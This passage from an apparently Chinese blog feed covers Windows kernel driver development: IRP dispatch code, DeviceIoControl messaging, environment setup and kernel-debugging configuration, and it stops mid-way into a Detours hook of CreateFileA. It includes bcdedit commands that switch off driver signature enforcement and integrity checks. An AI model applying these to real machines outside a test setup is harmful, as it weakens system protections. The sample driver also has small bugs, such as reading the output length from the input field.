IRP_MJ_FILE_SYSTEM_CONTROL      0x0d</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_DEVICE_CONTROL           0x0e</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_INTERNAL_DEVICE_CONTROL  0x0f</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_SHUTDOWN                 0x10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_LOCK_CONTROL             0x11</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_CLEANUP                  0x12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_CREATE_MAILSLOT          0x13</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_QUERY_SECURITY           0x14</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_SET_SECURITY             0x15</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_POWER                    0x16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_SYSTEM_CONTROL           0x17</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_DEVICE_CHANGE            0x18</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_QUERY_QUOTA              0x19</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_SET_QUOTA                0x1a</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_PNP                      0x1b</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_PNP_POWER                IRP_MJ_PNP      <span class="comment">// Obsolete....</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_MAXIMUM_FUNCTION         0x1b</span></span><br></pre></td></tr></table></figure>

<p>派遣函数一般也是有固定格式</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">NTSTATUS <span class="title function_">MyDispatchFunction</span><span class="params">(PDEVICE_OBJECT pDevObj, PIRP pIrp)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// 业务代码</span></span><br><span class="line">	<span class="comment">// 设置返回状态</span></span><br><span class="line">	pIrp-&gt;IoStatus.Status = STATUS_SUCCESS; </span><br><span class="line">	pIrp-&gt;IoStatus.Information = <span class="number">0</span>; <span class="comment">// 返回给3环多少数据，没有则填0 </span></span><br><span class="line">	IoCompleteRequest(pIrp, IO_NO_INCREMENT);</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 这里为了方便所有的请求都用一个处理函数，在函数内部去区分请求，再做不同的逻辑处理</span></span><br><span class="line"><span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; IRP_MJ_MAXIMUM_FUNCTION; i++)</span><br><span class="line">&#123;</span><br><span class="line">	DriverObject-&gt;MajorFunction[i] = MyDispatch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="灵活通信"><a href="#灵活通信" class="headerlink" title="灵活通信"></a>灵活通信</h5><h6 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h6><p>在应用层使用DeviceIoControl函数向驱动发送请求 DeviceIoControl会使内核中的设备对象收到一个设备控制请求</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//利用CTL_CODE这个宏来生成一个字节设备控制请求功能号  0-7ff已被微软保留 只能用比这个大的</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SENDSTR CTL_CODE(FILE_DEVICE_UNKNOWN,0x800,METHOD_BUFFERED,FILE_WRITE_DATA)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RECVSTR CTL_CODE(FILE_DEVICE_UNKNOWN,0x801,METHOD_BUFFERED,FILE_READ_DATA)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SEND_AND_RECV_STR CTL_CODE(FILE_DEVICE_UNKNOWN,0x802,METHOD_BUFFERED,FILE_ANY_ACCESS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STR_MAX_LEN 512 <span class="comment">//定义链表缓冲区最大长度</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//内存清零初始化函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">initoutbuf</span><span class="params">(UCHAR buf[STR_MAX_LEN])</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="type">char</span>) * STR_MAX_LEN);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="comment">//打开设备 L&quot;\\??\\MyDriverDemo&quot;   \\.\MyDriverDemo</span></span><br><span class="line">	HANDLE	device = CreateFileW(<span class="string">L&quot;\\\\.\\MyDriverDemo&quot;</span>, GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">		<span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (device == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[*]获取驱动句柄失败！错误：%d\n&quot;</span>, GetLastError());</span><br><span class="line">		getchar();</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//char* msg = &quot;[+]Ring3-&gt;Ring0&quot;;</span></span><br><span class="line">	UCHAR buffer[STR_MAX_LEN] ;<span class="comment">//初始化返回数据的缓冲区</span></span><br><span class="line">	DWORD size = <span class="number">0</span>;</span><br><span class="line">	 </span><br><span class="line">	<span class="comment">//给驱动发送请求  DeviceIoControl会使内核中的设备对象收到一个设备控制请求</span></span><br><span class="line"></span><br><span class="line">	BOOL bRet = DeviceIoControl(device, SEND_AND_RECV_STR, <span class="string">&quot;Ring3-&gt;Ring0&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;Ring3-&gt;Ring0&quot;</span>) + <span class="number">1</span>, (LPVOID)buffer, STR_MAX_LEN, &amp;size, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (bRet) &#123;		</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[+]接收到R0发送的消息%s\r\n&quot;</span>, buffer);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	CloseHandle(device);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="内核"><a href="#内核" class="headerlink" title="内核"></a>内核</h6><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ntddk.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义控制码</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SENDSTR CTL_CODE(FILE_DEVICE_UNKNOWN,0x800,METHOD_BUFFERED,FILE_WRITE_DATA)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RECVSTR CTL_CODE(FILE_DEVICE_UNKNOWN,0x801,METHOD_BUFFERED,FILE_READ_DATA)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SEND_AND_RECV_STR CTL_CODE(FILE_DEVICE_UNKNOWN,0x802,METHOD_BUFFERED,FILE_ANY_ACCESS)</span></span><br><span class="line"><span class="comment">//定义符号链接名</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYMBOLLINK <span class="string">L&quot;\\??\\MyDriverDemo&quot;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STR_MAX_LEN 512 <span class="comment">//定义链表缓冲区最大长度</span></span></span><br><span class="line"></span><br><span class="line">PDEVICE_OBJECT dev = <span class="literal">NULL</span>;<span class="comment">//初始化 控制设备</span></span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">CreateDevice</span><span class="params">(PDRIVER_OBJECT DriverObject)</span> &#123;</span><br><span class="line">	NTSTATUS Status;<span class="comment">//返回状态</span></span><br><span class="line">	UNICODE_STRING DeviceName;<span class="comment">//设备名称</span></span><br><span class="line">	UNICODE_STRING SymbolName;<span class="comment">//符号链接</span></span><br><span class="line">	RtlInitUnicodeString(&amp;DeviceName, <span class="string">L&quot;\\Device\\MyDriverDemo&quot;</span>);</span><br><span class="line"></span><br><span class="line">	Status = IoCreateDevice(</span><br><span class="line">		DriverObject,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		&amp;DeviceName,</span><br><span class="line">		FILE_DEVICE_UNKNOWN,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		TRUE,</span><br><span class="line">		&amp;dev</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (!NT_SUCCESS(Status))<span class="comment">//不成功</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (Status == STATUS_OBJECT_NAME_COLLISION)<span class="comment">//名称冲突</span></span><br><span class="line">			&#123;</span><br><span class="line">				DbgPrint(<span class="string">&quot;[*]设备名称冲突......\n&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			DbgPrint(<span class="string">&quot;[*]创建失败&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//初始化符号链接  (设备应用程序不可见 因此驱动要暴漏一个符号链接给应用层</span></span><br><span class="line">		RtlInitUnicodeString(&amp;SymbolName, SYMBOLLINK);</span><br><span class="line">		Status = IoCreateSymbolicLink(&amp;SymbolName, &amp;DeviceName);</span><br><span class="line">		<span class="keyword">if</span> (!NT_SUCCESS(Status)) &#123; <span class="comment">//不等于0</span></span><br><span class="line">			IoDeleteDevice(dev); <span class="comment">//删除设备</span></span><br><span class="line">			DbgPrint(<span class="string">&quot;[+]删除设备成功&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			DbgPrint(<span class="string">&quot;[+]创建符号链接成功&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">while</span> (FALSE);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//派遣函数</span></span><br><span class="line">NTSTATUS <span class="title function_">MyDispatch</span><span class="params">(PDEVICE_OBJECT dev, PIRP pIrp)</span> &#123;</span><br><span class="line">	NTSTATUS Status = STATUS_SUCCESS;<span class="comment">//返回状态</span></span><br><span class="line">	ULONG retLen = <span class="number">0</span>;</span><br><span class="line">	PIO_STACK_LOCATION IrpStack = IoGetCurrentIrpStackLocation(pIrp);	<span class="comment">//获取IRP数据</span></span><br><span class="line">	ULONG uIoControlCode = IrpStack-&gt;Parameters.DeviceIoControl.IoControlCode; <span class="comment">//获取操作码</span></span><br><span class="line">	</span><br><span class="line">	PVOID Outputbuffer = pIrp-&gt;AssociatedIrp.SystemBuffer;<span class="comment">//获取缓冲区地址(输入输出的缓存区都是一个,是共享的)</span></span><br><span class="line">	PVOID Inputbuffer = pIrp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">	ULONG uDataInlen = IrpStack-&gt;Parameters.DeviceIoControl.InputBufferLength; <span class="comment">//获取输入数据的长度</span></span><br><span class="line">	ULONG uDataOutlen = IrpStack-&gt;Parameters.DeviceIoControl.InputBufferLength; <span class="comment">//获取输出数据的长度</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (IrpStack-&gt;MajorFunction == IRP_MJ_DEVICE_CONTROL)&#123;</span><br><span class="line">		<span class="keyword">switch</span> (uIoControlCode)</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="comment">//case SENDSTR:</span></span><br><span class="line">			<span class="comment">//DbgPrint((char*)buffer);</span></span><br><span class="line">			<span class="comment">//retLen = uDataInlen;</span></span><br><span class="line">			<span class="comment">//break;</span></span><br><span class="line">		<span class="keyword">case</span> SEND_AND_RECV_STR:</span><br><span class="line">			<span class="keyword">if</span> (Inputbuffer != <span class="literal">NULL</span> &amp;&amp; uDataInlen &gt; <span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				DbgPrint(<span class="string">&quot;[+]接收到R3发送的消息:%s\r\n&quot;</span>, Inputbuffer);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (Outputbuffer != <span class="literal">NULL</span> &amp;&amp; uDataInlen &gt;= <span class="built_in">strlen</span>(<span class="string">&quot;Ring0-&gt;Ring3&quot;</span>) + <span class="number">1</span>) &#123;</span><br><span class="line">				<span class="built_in">memcpy</span>(Outputbuffer, <span class="string">&quot;Ring0-&gt;Ring3&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;Ring0-&gt;Ring3&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">				Status = STATUS_SUCCESS;</span><br><span class="line">				retLen = <span class="built_in">strlen</span>(<span class="string">&quot;Ring0-&gt;Ring3&quot;</span>) + <span class="number">1</span>;</span><br><span class="line">				<span class="comment">//DbgPrint(&quot;%s\r\n&quot;, Outputbuffer);</span></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="comment">//到这里的请求都是不接受的请求 一律返回非法参数错误</span></span><br><span class="line">			Status = STATUS_INVALID_PARAMETER;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//结束请求 用这个information记录返回</span></span><br><span class="line">	pIrp-&gt;IoStatus.Information = retLen;</span><br><span class="line">	pIrp-&gt;IoStatus.Status = Status;<span class="comment">// Ring3 GetLastError()</span></span><br><span class="line">	IoCompleteRequest(pIrp, IO_NO_INCREMENT);	<span class="comment">//将Irp返回给IO管理器</span></span><br><span class="line">	<span class="keyword">return</span> Status;<span class="comment">//RIng3 DeviceIoControl()返回值</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//卸载函数</span></span><br><span class="line">VOID <span class="title function_">DriverUnload</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (DriverObject != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		UNICODE_STRING SymbolName; <span class="comment">//初始化符号链接</span></span><br><span class="line">		RtlInitUnicodeString(&amp;SymbolName, SYMBOLLINK);</span><br><span class="line">		IoDeleteSymbolicLink(&amp;SymbolName); <span class="comment">//删除符号链接</span></span><br><span class="line">		<span class="keyword">if</span> (dev != <span class="literal">NULL</span>) &#123;</span><br><span class="line">			IoDeleteDevice(dev);</span><br><span class="line">		&#125;</span><br><span class="line">		DbgPrint(<span class="string">&quot;[+]删除设备和符号链接成功...\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(PDRIVER_OBJECT DriverObject, PUNICODE_STRING  RegistryPath)</span></span><br><span class="line">&#123;</span><br><span class="line">	DbgPrint(<span class="string">&quot;[%ws]Hello Kernel World\n&quot;</span>, __FUNCTIONW__);</span><br><span class="line">	<span class="keyword">if</span> (RegistryPath != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		DbgPrint(<span class="string">&quot;[%ws]所在注册表位置:%wZ\n&quot;</span>, __FUNCTIONW__, RegistryPath);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (DriverObject != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		DbgPrint(<span class="string">&quot;[%ws]驱动对象地址:%p\n&quot;</span>, __FUNCTIONW__, DriverObject);</span><br><span class="line">		<span class="comment">//创建控制设备</span></span><br><span class="line">		CreateDevice(DriverObject);</span><br><span class="line">		<span class="comment">//设置分发函数</span></span><br><span class="line">		<span class="comment">/*DriverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = MyDispatch;</span></span><br><span class="line"><span class="comment">		DriverObject-&gt;MajorFunction[IRP_MJ_CREATE] = CreateDispatchFunc;</span></span><br><span class="line"><span class="comment">		DriverObject-&gt;MajorFunction[IRP_MJ_CLOSE] = CloseDispatchFunc;*/</span></span><br><span class="line">		<span class="comment">// 这里driver-&gt;MajorFunction是一个数组，不同的请求可以设置不同的处理函数</span></span><br><span class="line">		<span class="comment">// 这里为了方便所有的请求都用一个处理函数，在函数内部去区分请求，再做不同的逻辑处理</span></span><br><span class="line">		<span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; IRP_MJ_MAXIMUM_FUNCTION; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			DriverObject-&gt;MajorFunction[i] = MyDispatch;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		DriverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line">		DbgPrint(<span class="string">&quot;[+]驱动加载成功&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/dc4ad149/10.png" alt="img"></p>
]]></content>
      <categories>
        <category>驱动</category>
      </categories>
      <tags>
        <tag>驱动</tag>
      </tags>
  </entry>
  <entry>
    <title>驱动-1_开发环境配置及使用</title>
    <url>/posts/39878b26/</url>
    <content><![CDATA[<h3 id="驱动环境安装"><a href="#驱动环境安装" class="headerlink" title="驱动环境安装"></a>驱动环境安装</h3><ol>
<li>安装Vs2022</li>
<li>安装SDK</li>
<li>安装WDK</li>
</ol>
<h3 id="DriverDemo"><a href="#DriverDemo" class="headerlink" title="DriverDemo"></a>DriverDemo</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ntddk.h&quot;</span></span></span><br><span class="line">VOID <span class="title function_">DriverUnload</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (DriverObject != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        DbgPrint(<span class="string">&quot;[%ws]Driver Upload,Driver Object Address:%p&quot;</span>, __FUNCTIONW__,DriverObject);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">( PDRIVER_OBJECT DriverObject,PUNICODE_STRING  RegistryPath)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//KdBreakPoint();</span></span><br><span class="line">    DbgPrint(<span class="string">&quot;[%ws]Hello Kernel World\n&quot;</span>,__FUNCTIONW__);</span><br><span class="line">    <span class="keyword">if</span> (RegistryPath != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        DbgPrint(<span class="string">&quot;[%ws]所在注册表位置:%wZ\n&quot;</span>, __FUNCTIONW__,RegistryPath);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (DriverObject != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        DbgPrint(<span class="string">&quot;[%ws]驱动对象地址:%p\n&quot;</span>, __FUNCTIONW__,DriverObject);</span><br><span class="line">        DriverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="error-MSB8040-此项目需要缓解了-Spectre-漏洞的库"><a href="#error-MSB8040-此项目需要缓解了-Spectre-漏洞的库" class="headerlink" title="error MSB8040: 此项目需要缓解了 Spectre 漏洞的库"></a>error MSB8040: 此项目需要缓解了 Spectre 漏洞的库</h4><p><a href="https://www.cnblogs.com/hack747/p/16398455.html">https://www.cnblogs.com/hack747/p/16398455.html</a></p>
<p>安装对应版本的Spectre缓解库</p>
<p><img src="/posts/39878b26/1.png" alt="img"></p>
<h4 id="MyDriver1-inf-error-1297-Device-driver-does-not-install-on-any-devices"><a href="#MyDriver1-inf-error-1297-Device-driver-does-not-install-on-any-devices" class="headerlink" title="MyDriver1.inf : error 1297: Device driver does not install on any devices"></a>MyDriver1.inf : error 1297: Device driver does not install on any devices</h4><p>删除.inf文件重新编译即可</p>
<h3 id="驱动签名禁用"><a href="#驱动签名禁用" class="headerlink" title="驱动签名禁用"></a>驱动签名禁用</h3><p><a href="https://zh.theihccforum.com/how-disable-driver-signature-enforcement-windows-10">https://zh.theihccforum.com/how-disable-driver-signature-enforcement-windows-10</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bcdedit /set nointegritychecks on</span><br><span class="line">bcdedit /set testsigning on</span><br><span class="line">bcdedit /set loadoptions DDISABLE_INTEGRITY_CHECKS</span><br></pre></td></tr></table></figure>

<h3 id="驱动加载运行"><a href="#驱动加载运行" class="headerlink" title="驱动加载运行"></a>驱动加载运行</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sc create scdemo binPath=<span class="string">&quot;c:\demo.sys&quot;</span> type= kernel start= demand</span><br><span class="line">sc start scdemo</span><br><span class="line">sc stop scdemo</span><br><span class="line">sc delete scdemo</span><br></pre></td></tr></table></figure>



<h3 id="使用Drover-Loader-Unloader-加载驱动"><a href="#使用Drover-Loader-Unloader-加载驱动" class="headerlink" title="使用Drover Loader/Unloader 加载驱动"></a>使用Drover Loader/Unloader 加载驱动</h3><p><img src="/posts/39878b26/2.png" alt="img"></p>
<p>可以使用debugview查看加载内容</p>
<p><img src="/posts/39878b26/3.png" alt="img"></p>
<h3 id="MacOs下-Windbg-view-双机调试配置"><a href="#MacOs下-Windbg-view-双机调试配置" class="headerlink" title="MacOs下 Windbg view 双机调试配置"></a>MacOs下 Windbg view 双机调试配置</h3><h4 id="Net"><a href="#Net" class="headerlink" title="Net"></a>Net</h4><p>net相对于使用串口较为简单设置些</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//调试机器	： 192.168.181.130</span></span><br><span class="line"><span class="comment">//被调试机器 	： 192.168.181.138</span></span><br><span class="line"><span class="comment">//被调试机下生成key</span></span><br><span class="line">bcdedit /debug on</span><br><span class="line">bcdedit /dbgsettings net hostip:<span class="number">192.168</span><span class="number">.181</span><span class="number">.130</span> port:<span class="number">50010</span></span><br><span class="line">Key=<span class="number">3</span>cb9a0g3w94mp<span class="number">.1</span>pnw6lxz6ohti<span class="number">.38</span>p3gpzpdrc7k.qqgcqkf16kuv</span><br><span class="line"></span><br><span class="line"><span class="comment">//在调试机windbg下attach to kernel进行net连接</span></span><br></pre></td></tr></table></figure>

<p><img src="/posts/39878b26/4.png" alt="img"></p>
<p><img src="/posts/39878b26/5.png" alt="img"></p>
<h4 id="Com"><a href="#Com" class="headerlink" title="Com"></a>Com</h4><h5 id="1-找到对应的虚拟机-vmx文件进行修改"><a href="#1-找到对应的虚拟机-vmx文件进行修改" class="headerlink" title="1.找到对应的虚拟机.vmx文件进行修改"></a>1.找到对应的虚拟机.vmx文件进行修改</h5><p>被调试机器设置</p>
<p>将原有的 serial0项删除替换</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">serial0.fileType = <span class="string">&quot;thinprint&quot;</span></span><br><span class="line">serial0.fileName = <span class="string">&quot;thinprint&quot;</span></span><br><span class="line">serial0.fileName = <span class="string">&quot;/Users/&#123;name&#125;/com1&quot;</span></span><br><span class="line">serial0.present = <span class="string">&quot;TRUE&quot;</span></span><br><span class="line">serial0.fileType = <span class="string">&quot;pipe&quot;</span></span><br><span class="line">serial0.yieldOnMsrRead = <span class="string">&quot;TRUE&quot;</span></span><br><span class="line">serial0.startConnected = <span class="string">&quot;TRUE&quot;</span></span><br></pre></td></tr></table></figure>

<p>调试机器设置</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">serial0.fileType = <span class="string">&quot;thinprint&quot;</span></span><br><span class="line">serial0.fileName = <span class="string">&quot;thinprint&quot;</span></span><br><span class="line">serial0.present = <span class="string">&quot;TRUE&quot;</span></span><br><span class="line">serial0.present = <span class="string">&quot;TRUE&quot;</span></span><br><span class="line">serial0.fileType = <span class="string">&quot;pipe&quot;</span></span><br><span class="line">serial0.fileName = <span class="string">&quot;/Users/&#123;name&#125;/com1&quot;</span></span><br><span class="line">serial0.yieldOnMsrRead = <span class="string">&quot;TRUE&quot;</span></span><br><span class="line">serial0.tryNoRxLoss = <span class="string">&quot;FALSE&quot;</span></span><br><span class="line">serial0.pipe.endPoint = <span class="string">&quot;client&quot;</span></span><br></pre></td></tr></table></figure>

<p>{name}替换为自己电脑的用户名</p>
<h5 id="2-被调试机设置开启串口-管理员cmd运行以下命令"><a href="#2-被调试机设置开启串口-管理员cmd运行以下命令" class="headerlink" title="2. 被调试机设置开启串口 管理员cmd运行以下命令"></a>2. 被调试机设置开启串口 管理员cmd运行以下命令</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">bcdedit /<span class="class"><span class="keyword">enum</span> <span class="title">ACTIVE</span></span></span><br><span class="line"><span class="class"><span class="title">bcdedit</span> /<span class="title">dbgsettings</span> <span class="title">serial</span> <span class="title">baudrate</span>:</span><span class="number">115200</span> debugport:<span class="number">1</span></span><br><span class="line">bcdedit /copy &#123;current&#125; /d <span class="string">&quot;Windows Debug Entry&quot;</span></span><br><span class="line">    </span><br><span class="line">bcdedit /displayorder &#123;current&#125; &#123;上一行的id&#125;</span><br><span class="line">bcdedit /displayorder &#123;current&#125; &#123;f08931ce<span class="number">-554</span>a<span class="number">-11</span>ed<span class="number">-850</span>e-c773c5b7f7b1&#125;</span><br><span class="line"></span><br><span class="line">bcdedit /debug &#123;上一行的id&#125; ON</span><br><span class="line">bcdedit /debug  &#123;f08931ce<span class="number">-554</span>a<span class="number">-11</span>ed<span class="number">-850</span>e-c773c5b7f7b1&#125; ON</span><br><span class="line"></span><br><span class="line">bcdedit -<span class="built_in">set</span> TESTSIGNING on</span><br><span class="line">bcdedit /dbgsettings</span><br></pre></td></tr></table></figure>

<p><img src="/posts/39878b26/6.png" alt="img"></p>
<p>设置完成后重启系统 选择第二项</p>
<p><img src="/posts/39878b26/7.png" alt="img"></p>
<h5 id="3-调试机设置"><a href="#3-调试机设置" class="headerlink" title="3.调试机设置"></a>3.调试机设置</h5><p>计算机管理 - 设备管理器- 端口-通信端口-端口设置   设置为115200</p>
<p><img src="/posts/39878b26/8.png" alt="img"></p>
<h5 id="4-调试机windbg-kernel-Debugging-com连接进行调试"><a href="#4-调试机windbg-kernel-Debugging-com连接进行调试" class="headerlink" title="4.调试机windbg kernel Debugging com连接进行调试"></a>4.调试机windbg kernel Debugging com连接进行调试</h5><p><img src="/posts/39878b26/9.png" alt="img"></p>
<h4 id="使用VirtualKD-Redux（×）"><a href="#使用VirtualKD-Redux（×）" class="headerlink" title="使用VirtualKD-Redux（×）"></a>使用VirtualKD-Redux（×）</h4><p>在mac下使用虚拟机通过该方法尝试时没能成功 </p>
<p><a href="https://github.com/4d61726b/VirtualKD-Redux">https://github.com/4d61726b/VirtualKD-Redux</a></p>
<p>安装重启后 进入该模式F8关闭签名后会一直卡死。。。</p>
<p><img src="/posts/39878b26/10.png" alt="img"></p>
]]></content>
      <categories>
        <category>驱动</category>
      </categories>
      <tags>
        <tag>驱动</tag>
      </tags>
  </entry>
  <entry>
    <title>Detours使用</title>
    <url>/posts/64796bf6/</url>
    <content><![CDATA[<h4 id="拦截文件创建"><a href="#拦截文件创建" class="headerlink" title="拦截文件创建"></a>拦截文件创建</h4><p>hook CreateFielA</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;detours.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;detours.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">HANDLE (WINAPI* oldCreateFileA)(</span><br><span class="line">     LPCSTR lpFileName,</span><br><span class="line">     DWORD dwDesiredAccess,</span><br><span class="line">     DWORD dwShareMode,</span><br><span class="line">     LPSECURITY_ATTRIBUTES lpSecurityAttributes,</span><br><span class="line">     DWORD dwCreationDisposition,</span><br><span class="line">     DWORD dwFlagsAndAttributes,</span><br><span class="line">     HANDLE hTemplateFile</span><br><span class="line">)= CreateFileA;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HANDLE WINAPI <span class="title function_">MyCreateFileA</span><span 